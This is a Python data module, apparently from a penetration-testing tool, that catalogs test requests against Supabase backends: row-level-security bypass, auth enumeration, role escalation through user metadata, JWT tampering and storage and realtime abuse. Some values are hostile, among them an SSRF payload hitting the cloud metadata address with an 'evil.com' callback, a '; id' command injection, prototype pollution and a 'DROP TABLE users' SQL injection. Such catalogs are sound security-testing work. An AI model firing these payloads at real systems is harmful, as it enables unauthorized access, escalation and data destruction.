"""Supabase test payload catalog for deep BaaS testing.

Payload definitions for RLS policy testing, auth enumeration, Edge Function
probing, Storage bucket abuse, Realtime subscription hijacking, user metadata
escalation, JWT manipulation, and database function enumeration. Kept in a
data-only module so SupabaseTester stays focused on execution logic.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any

from titan.core.models import Severity


@dataclass
class SupabasePayload:
    """A Supabase-specific test payload."""

    name: str
    category: str
    endpoint: str
    method: str
    payload: Any
    expected_effect: str
    severity: Severity
    confidence: float
    headers: dict[str, str] | None = None


# ── RLS Policy Testing Payloads ─────────────────────────────────────

RLS_TEST_PAYLOADS = [
    # Unauthenticated access to tables
    SupabasePayload(
        name="unauthenticated_select",
        category="rls_testing",
        endpoint="/rest/v1/{table}?select=*",
        method="GET",
        payload=None,
        expected_effect="data_exposure",
        severity=Severity.CRITICAL,
        confidence=0.95,
    ),
    SupabasePayload(
        name="unauthenticated_insert",
        category="rls_testing",
        endpoint="/rest/v1/{table}",
        method="POST",
        payload={"data": "test"},
        expected_effect="unauthorized_write",
        severity=Severity.CRITICAL,
        confidence=0.90,
    ),
    SupabasePayload(
        name="unauthenticated_update",
        category="rls_testing",
        endpoint="/rest/v1/{table}?id=eq.1",
        method="PATCH",
        payload={"data": "modified"},
        expected_effect="unauthorized_modify",
        severity=Severity.CRITICAL,
        confidence=0.90,
    ),
    SupabasePayload(
        name="unauthenticated_delete",
        category="rls_testing",
        endpoint="/rest/v1/{table}?id=eq.1",
        method="DELETE",
        payload=None,
        expected_effect="unauthorized_delete",
        severity=Severity.CRITICAL,
        confidence=0.90,
    ),
    # Cross-tenant access
    SupabasePayload(
        name="cross_tenant_select",
        category="rls_testing",
        endpoint="/rest/v1/{table}?user_id=neq.{current_user_id}",
        method="GET",
        payload=None,
        expected_effect="cross_tenant_data",
        severity=Severity.CRITICAL,
        confidence=0.95,
    ),
    # Admin table access
    SupabasePayload(
        name="admin_table_access",
        category="rls_testing",
        endpoint="/rest/v1/admin?select=*",
        method="GET",
        payload=None,
        expected_effect="admin_data_exposure",
        severity=Severity.CRITICAL,
        confidence=0.90,
    ),
    SupabasePayload(
        name="users_table_access",
        category="rls_testing",
        endpoint="/rest/v1/users?select=*",
        method="GET",
        payload=None,
        expected_effect="user_data_exposure",
        severity=Severity.CRITICAL,
        confidence=0.95,
    ),
    SupabasePayload(
        name="auth_users_access",
        category="rls_testing",
        endpoint="/rest/v1/auth.users?select=*",
        method="GET",
        payload=None,
        expected_effect="auth_data_exposure",
        severity=Severity.CRITICAL,
        confidence=0.95,
    ),
]

# ── Auth Settings Enumeration Payloads ───────────────────────────────

AUTH_ENUM_PAYLOADS = [
    SupabasePayload(
        name="auth_settings",
        category="auth_enumeration",
        endpoint="/auth/v1/settings",
        method="GET",
        payload=None,
        expected_effect="auth_config_leak",
        severity=Severity.HIGH,
        confidence=0.85,
    ),
    SupabasePayload(
        name="auth_signup",
        category="auth_enumeration",
        endpoint="/auth/v1/signup",
        method="POST",
        payload={"email": "test@test.com", "password": "test123"},  # pragma: allowlist secret
        expected_effect="signup_allowed",
        severity=Severity.MEDIUM,
        confidence=0.70,
    ),
    SupabasePayload(
        name="auth_signup_phone",
        category="auth_enumeration",
        endpoint="/auth/v1/signup",
        method="POST",
        payload={"phone": "+1234567890", "password": "test123"},  # pragma: allowlist secret
        expected_effect="phone_signup_allowed",
        severity=Severity.HIGH,
        confidence=0.80,
    ),
    SupabasePayload(
        name="auth_admin_users",
        category="auth_enumeration",
        endpoint="/auth/v1/admin/users",
        method="GET",
        payload=None,
        expected_effect="admin_users_leak",
        severity=Severity.CRITICAL,
        confidence=0.95,
    ),
    SupabasePayload(
        name="auth_admin_users_page",
        category="auth_enumeration",
        endpoint="/auth/v1/admin/users?page=1",
        method="GET",
        payload=None,
        expected_effect="admin_users_leak",
        severity=Severity.CRITICAL,
        confidence=0.95,
    ),
    SupabasePayload(
        name="auth_token",
        category="auth_enumeration",
        endpoint="/auth/v1/token?grant_type=password",
        method="POST",
        payload={"email": "test@test.com", "password": "test123"},  # pragma: allowlist secret
        expected_effect="token_endpoint",
        severity=Severity.MEDIUM,
        confidence=0.70,
    ),
    SupabasePayload(
        name="auth Recover",
        category="auth_enumeration",
        endpoint="/auth/v1/recover",
        method="POST",
        payload={"email": "test@test.com"},
        expected_effect="password_recovery",
        severity=Severity.LOW,
        confidence=0.60,
    ),
    SupabasePayload(
        name="auth_user",
        category="auth_enumeration",
        endpoint="/auth/v1/user",
        method="GET",
        payload=None,
        expected_effect="user_endpoint",
        severity=Severity.LOW,
        confidence=0.60,
    ),
]

# ── Edge Function Probing Payloads ──────────────────────────────────

EDGE_FUNCTION_PAYLOADS = [
    SupabasePayload(
        name="list_functions",
        category="edge_functions",
        endpoint="/functions/v1/",
        method="GET",
        payload=None,
        expected_effect="function_list",
        severity=Severity.MEDIUM,
        confidence=0.75,
    ),
    SupabasePayload(
        name="invoke_without_auth",
        category="edge_functions",
        endpoint="/functions/v1/{function}",
        method="POST",
        payload={},
        expected_effect="unauthorized_invoke",
        severity=Severity.HIGH,
        confidence=0.80,
    ),
    SupabasePayload(
        name="invoke_with_anon_key",
        category="edge_functions",
        endpoint="/functions/v1/{function}",
        method="POST",
        payload={},
        headers={"Authorization": "Bearer {anon_key}"},
        expected_effect="anon_invoke",
        severity=Severity.HIGH,
        confidence=0.85,
    ),
    SupabasePayload(
        name="parameter_injection",
        category="edge_functions",
        endpoint="/functions/v1/{function}",
        method="POST",
        payload={"__proto__": {"admin": True}, "constructor": {"prototype": {"admin": True}}},
        expected_effect="prototype_pollution",
        severity=Severity.CRITICAL,
        confidence=0.80,
    ),
    SupabasePayload(
        name="ssrf_via_function",
        category="edge_functions",
        endpoint="/functions/v1/{function}",
        method="POST",
        payload={"url": "http://169.254.169.254/latest/meta-data/", "callback": "http://evil.com"},
        expected_effect="ssrf",
        severity=Severity.CRITICAL,
        confidence=0.85,
    ),
    SupabasePayload(
        name="command_injection",
        category="edge_functions",
        endpoint="/functions/v1/{function}",
        method="POST",
        payload={"input": "; id", "command": "ls -la"},
        expected_effect="command_injection",
        severity=Severity.CRITICAL,
        confidence=0.80,
    ),
]

# ── Storage Bucket Abuse Payloads ───────────────────────────────────

STORAGE_ABUSE_PAYLOADS = [
    SupabasePayload(
        name="list_buckets",
        category="storage_abuse",
        endpoint="/storage/v1/bucket",
        method="GET",
        payload=None,
        expected_effect="bucket_list",
        severity=Severity.MEDIUM,
        confidence=0.80,
    ),
    SupabasePayload(
        name="list_objects",
        category="storage_abuse",
        endpoint="/storage/v1/object/{bucket}/",
        method="GET",
        payload=None,
        expected_effect="object_list",
        severity=Severity.HIGH,
        confidence=0.85,
    ),
    SupabasePayload(
        name="download_object",
        category="storage_abuse",
        endpoint="/storage/v1/object/{bucket}/{path}",
        method="GET",
        payload=None,
        expected_effect="object_download",
        severity=Severity.HIGH,
        confidence=0.80,
    ),
    SupabasePayload(
        name="upload_object",
        category="storage_abuse",
        endpoint="/storage/v1/object/{bucket}",
        method="POST",
        payload={"file": "test"},
        expected_effect="unauthorized_upload",
        severity=Severity.CRITICAL,
        confidence=0.85,
    ),
    SupabasePayload(
        name="delete_object",
        category="storage_abuse",
        endpoint="/storage/v1/object/{bucket}/{path}",
        method="DELETE",
        payload=None,
        expected_effect="unauthorized_delete",
        severity=Severity.CRITICAL,
        confidence=0.85,
    ),
    SupabasePayload(
        name="create_bucket",
        category="storage_abuse",
        endpoint="/storage/v1/bucket",
        method="POST",
        payload={"id": "evil-bucket", "name": "evil-bucket"},
        expected_effect="bucket_creation",
        severity=Severity.HIGH,
        confidence=0.80,
    ),
    SupabasePayload(
        name="signed_url_generation",
        category="storage_abuse",
        endpoint="/storage/v1/object/sign/{bucket}/{path}",
        method="POST",
        payload={"expiresIn": 31536000},
        expected_effect="signed_url",
        severity=Severity.HIGH,
        confidence=0.75,
    ),
]

# ── Realtime Subscription Hijacking Payloads ────────────────────────

REALTIME_HIJACK_PAYLOADS = [
    SupabasePayload(
        name="subscribe_all_tables",
        category="realtime_hijack",
        endpoint="/realtime/v1/websocket",
        method="WS",
        payload={"event": "phx_join", "topic": "realtime:*", "payload": {"config": {"broadcast": {"self": True}}}},
        expected_effect="wildcard_subscribe",
        severity=Severity.CRITICAL,
        confidence=0.90,
    ),
    SupabasePayload(
        name="subscribe_admin_table",
        category="realtime_hijack",
        endpoint="/realtime/v1/websocket",
        method="WS",
        payload={"event": "phx_join", "topic": "realtime:admin", "payload": {}},
        expected_effect="admin_table_subscribe",
        severity=Severity.CRITICAL,
        confidence=0.90,
    ),
    SupabasePayload(
        name="subscribe_users_table",
        category="realtime_hijack",
        endpoint="/realtime/v1/websocket",
        method="WS",
        payload={"event": "phx_join", "topic": "realtime:users", "payload": {}},
        expected_effect="users_table_subscribe",
        severity=Severity.CRITICAL,
        confidence=0.95,
    ),
    SupabasePayload(
        name="subscribe_auth_table",
        category="realtime_hijack",
        endpoint="/realtime/v1/websocket",
        method="WS",
        payload={"event": "phx_join", "topic": "realtime:auth.users", "payload": {}},
        expected_effect="auth_table_subscribe",
        severity=Severity.CRITICAL,
        confidence=0.95,
    ),
]

# ── User Metadata Escalation Payloads ───────────────────────────────

METADATA_ESCALATION_PAYLOADS = [
    SupabasePayload(
        name="set_admin_role",
        category="metadata_escalation",
        endpoint="/auth/v1/user",
        method="PUT",
        payload={"data": {"role": "admin", "is_admin": True}},
        expected_effect="role_escalation",
        severity=Severity.CRITICAL,
        confidence=0.90,
    ),
    SupabasePayload(
        name="set_superuser_role",
        category="metadata_escalation",
        endpoint="/auth/v1/user",
        method="PUT",
        payload={"data": {"role": "superuser", "is_superuser": True}},
        expected_effect="role_escalation",
        severity=Severity.CRITICAL,
        confidence=0.90,
    ),
    SupabasePayload(
        name="set_admin_permissions",
        category="metadata_escalation",
        endpoint="/auth/v1/user",
        method="PUT",
        payload={"data": {"permissions": ["admin", "superuser", "root"]}},
        expected_effect="permission_escalation",
        severity=Severity.CRITICAL,
        confidence=0.85,
    ),
    SupabasePayload(
        name="set_service_role",
        category="metadata_escalation",
        endpoint="/auth/v1/user",
        method="PUT",
        payload={"data": {"role": "service_role"}},
        expected_effect="service_role_escalation",
        severity=Severity.CRITICAL,
        confidence=0.95,
    ),
    SupabasePayload(
        name="set_email_verified",
        category="metadata_escalation",
        endpoint="/auth/v1/user",
        method="PUT",
        payload={"data": {"email_verified": True, "phone_verified": True}},
        expected_effect="verification_bypass",
        severity=Severity.HIGH,
        confidence=0.80,
    ),
    SupabasePayload(
        name="set_org_id",
        category="metadata_escalation",
        endpoint="/auth/v1/user",
        method="PUT",
        payload={"data": {"org_id": 1, "organization_id": 1}},
        expected_effect="org_escalation",
        severity=Severity.HIGH,
        confidence=0.80,
    ),
]

# ── JWT Manipulation Payloads ───────────────────────────────────────

JWT_MANIPULATION_PAYLOADS = [
    SupabasePayload(
        name="jwt_decode",
        category="jwt_manipulation",
        endpoint="/auth/v1/user",
        method="GET",
        payload=None,
        headers={"Authorization": "Bearer {decoded_jwt}"},
        expected_effect="jwt_decode",
        severity=Severity.MEDIUM,
        confidence=0.70,
    ),
    SupabasePayload(
        name="jwt_role_claim",
        category="jwt_manipulation",
        endpoint="/rest/v1/{table}",
        method="GET",
        payload=None,
        headers={"Authorization": "Bearer {jwt_with_role_claim}"},
        expected_effect="role_claim_injection",
        severity=Severity.CRITICAL,
        confidence=0.90,
    ),
    SupabasePayload(
        name="jwt_expired_token",
        category="jwt_manipulation",
        endpoint="/rest/v1/{table}",
        method="GET",
        payload=None,
        headers={"Authorization": "Bearer {expired_jwt}"},
        expected_effect="expired_token_accepted",
        severity=Severity.HIGH,
        confidence=0.80,
    ),
    SupabasePayload(
        name="jwt_refresh_abuse",
        category="jwt_manipulation",
        endpoint="/auth/v1/token?grant_type=refresh_token",
        method="POST",
        payload={"refresh_token": "{refresh_token}"},
        expected_effect="token_refresh",
        severity=Severity.MEDIUM,
        confidence=0.70,
    ),
    SupabasePayload(
        name="jwt_service_role_key",
        category="jwt_manipulation",
        endpoint="/rest/v1/{table}",
        method="GET",
        payload=None,
        headers={"Authorization": "Bearer {service_role_jwt}"},
        expected_effect="service_role_access",
        severity=Severity.CRITICAL,
        confidence=0.95,
    ),
]

# ── Database Function Enumeration Payloads ──────────────────────────

DB_FUNCTION_PAYLOADS = [
    SupabasePayload(
        name="rpc_get_public_profiles",
        category="db_functions",
        endpoint="/rest/v1/rpc/get_public_profiles",
        method="POST",
        payload={},
        expected_effect="function_access",
        severity=Severity.MEDIUM,
        confidence=0.70,
    ),
    SupabasePayload(
        name="rpc_get_org_role",
        category="db_functions",
        endpoint="/rest/v1/rpc/get_org_role",
        method="POST",
        payload={"_org_id": 1, "_user_id": 1},
        expected_effect="function_access",
        severity=Severity.HIGH,
        confidence=0.80,
    ),
    SupabasePayload(
        name="rpc_admin_only_function",
        category="db_functions",
        endpoint="/rest/v1/rpc/admin_only_function",
        method="POST",
        payload={},
        expected_effect="admin_function_access",
        severity=Severity.CRITICAL,
        confidence=0.90,
    ),
    SupabasePayload(
        name="rpc_sql_injection",
        category="db_functions",
        endpoint="/rest/v1/rpc/{function}",
        method="POST",
        payload={"param": "'; DROP TABLE users--"},
        expected_effect="sql_injection",
        severity=Severity.CRITICAL,
        confidence=0.85,
    ),
    SupabasePayload(
        name="rpc_function_enumeration",
        category="db_functions",
        endpoint="/rest/v1/rpc/",
        method="GET",
        payload=None,
        expected_effect="function_list",
        severity=Severity.MEDIUM,
        confidence=0.70,
    ),
]
